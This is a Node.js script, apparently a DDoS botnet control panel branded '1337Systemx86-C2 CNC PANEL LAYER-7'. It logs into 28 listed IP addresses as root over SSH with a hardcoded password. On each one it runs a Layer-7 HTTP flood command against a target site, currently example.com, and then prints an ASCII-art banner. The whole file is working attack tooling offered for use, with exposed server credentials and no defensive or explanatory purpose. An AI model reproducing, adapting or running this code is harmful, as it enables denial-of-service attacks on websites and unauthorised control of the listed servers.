const { Client } = require('ssh2');

// Serverliste
const servers = [
    '188.245.189.63',
    '138.199.211.62',
    '167.235.60.99',
    '78.47.135.99',
    '65.109.1.37',
    '148.251.11.253',
    '148.251.12.75',
    '148.251.12.190',
    '188.40.125.171',
    '5.9.149.109',
    '88.99.62.37',
    '167.235.143.200',
    '78.47.39.248',
    '157.90.26.239',
    '142.132.188.110',
    '157.90.26.239',
    '162.55.170.69',
    '148.251.12.74',
    '148.251.12.72',
    '148.251.12.68',
    '136.243.88.186',
    '136.243.89.48',
    '188.245.167.203',
    '45.131.109.154',
    '78.46.237.191',
    '188.245.116.136',
    '91.99.92.150',
    '148.251.11.163'
];

// Fester Befehl der an alle Server gesendet wird
const COMMAND = 'node new.js example.com 60 1000 500 http.txt flood\nexit\n';

// Verbindung zu jedem Server herstellen
servers.forEach((server, index) => {
    const conn = new Client();
    
    conn.on('ready', () => {
        console.log(`\x1B[32mClient > ${index + 1} connected (${server})\x1B[0m`);
        conn.shell((err, stream) => {
            if (err) {
                console.log(`\x1B[31mFehler bei ${server}: ${err}\x1B[0m`);
                return;
            }
            stream.end(COMMAND);
        });
    });
    
    conn.on('error', (err) => {
        console.log(`\x1B[31mVerbindungsfehler mit ${server}: ${err}\x1B[0m`);
    });
    
    conn.on('close', () => {
        console.log(`\x1B[33mVerbindung zu ${server} geschlossen\x1B[0m`);
    });
    
    conn.connect({
        host: server,
        port: 22,
        username: 'root',
        password: 'Maiki123',
        readyTimeout: 5000
    });
});

// Banner anzeigen
console.log("");
console.log("                        $$$$$$$$$$$$$$$$$$$$$$$");
console.log("                    $$$$___$$$$$$$$$$$$$$$$$$$$$");
console.log("                  $$$$______$$$$$$$$$$$$$$$$$$$$$$");
console.log("                $$$$$________$$$$$$$$$$$$$$$$$$$$$$$");
console.log("               $$$$$__________$$$$$$$$$$$$$$$$$$$$$$$");
console.log("              $$$$$____________$$$$$$$$$$$$$$$$$$$$$$$");
console.log("             $$$$$$____________$$$$$$$$$$$$$$$$$$$$$$$$");
console.log("             $$$$$$___________$$$$$$$$$___________$$$$$$");
console.log("             $$…$$$$$_________$$$_$$$_$$$_________$$$$$$");
console.log("             $$$$$$$$______$$$$___$___$$$$______$$$$$$$$");
console.log("             $$$$$$$$$$$$$$$$$___$$$___$$$$$$$$$$$$$$$$$");
console.log("             $$$_$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$_o$$");
console.log("             $$$__$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$__$$$");
console.log("              $$$__$'$$$$$$$$$$$$$$$$$$$$$$$$$$$$$__o$$$");
console.log("              '$$o__$$__$$'$$$$$$$$$$$$$$'$$__$$_____o$$");
console.log("                $$o$____$$__'$$'$$'$$'__$$______$___o$$");
console.log("                 $$$o$__$____$$___$$___$$_____$$__o$");
console.log("                  '$$$$O$____$$____$$___$$ ____o$$$");
console.log("                     '$$o$$___$$___$$___$$___o$$$");
console.log("                       '$$$$o$o$o$o$o$o$o$o$$$$");
console.log("");

console.log("\033[97m            [\033[31m 1337Systemx86-C2 CNC PANEL LAYER-7 \033[31m]\r\n");
console.log(`\x1B[36m [1337Systemx86-C2] \x1B[36m Befehl an alle Server gesendet`);
console.log(`\x1B[36m [1337Systemx86-C2] Server: ${servers.length} Nodes\x1B[0m`);
console.log("");
console.log("\x1B[36m [1337Systemx86-C2] C2 Control Panel made By DarlingSh & KDM");
console.log("");